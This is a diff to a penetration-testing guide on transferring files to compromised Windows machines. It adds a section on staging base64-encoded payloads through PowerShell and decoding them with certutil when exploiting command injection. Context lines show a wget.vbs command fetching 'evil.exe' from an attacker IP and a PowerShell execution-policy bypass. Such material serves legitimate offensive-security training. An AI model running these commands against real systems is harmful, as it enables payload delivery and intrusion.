@@ -27,9 +27,9 @@ Of course you need to have a ftp-server configured with the user asshat and the 
 
 ## TFTP
 
-Works by default on:  
+Works by default on:
 
-**Windows XP**  
+**Windows XP**
 
 **Windows 2003**
 
@@ -105,6 +105,7 @@ echo ts.Close >> wget.vbs
 ```
 
 You then execute the script like this:
+
 ```
 cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
 ```
@@ -126,6 +127,24 @@ Now we invoke it with this crazy syntax:
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
+
+## Powershell - Base64
+
+An alternative to the above powershell method is base64 transferring a file.  This can come in useful if dealing with command injection, where a full shell isn't possible, but you're able to run command on the device.  For this it's important to remember that the maximum length of a command in cmd.exe is 8191 characters.  
+
+You can, however, build a sequence of commands which output chunks of base64 to a file, as below.
+
+```
+powershell -c "$b64='BASE64DATA';[io.file]::AppendAllText('%TEMP%/outfile.b64', $b64);"
+```
+
+Then it becomes a matter of decoding the final file using certutil.
+
+```
+certutil -decode %TEMP%\outfile.b64 %TEMP%\outfile.ps1
+```
+
+This should work for both ps1 and full executables, but it has been found to be a bit flaky for full executables.  Smaller ps1 scripts are safer.  Ensure certutil is actually installed on the computer first, otherwise the decoding step can be performed with a further powershell step.
 
 ## Debug.exe
 
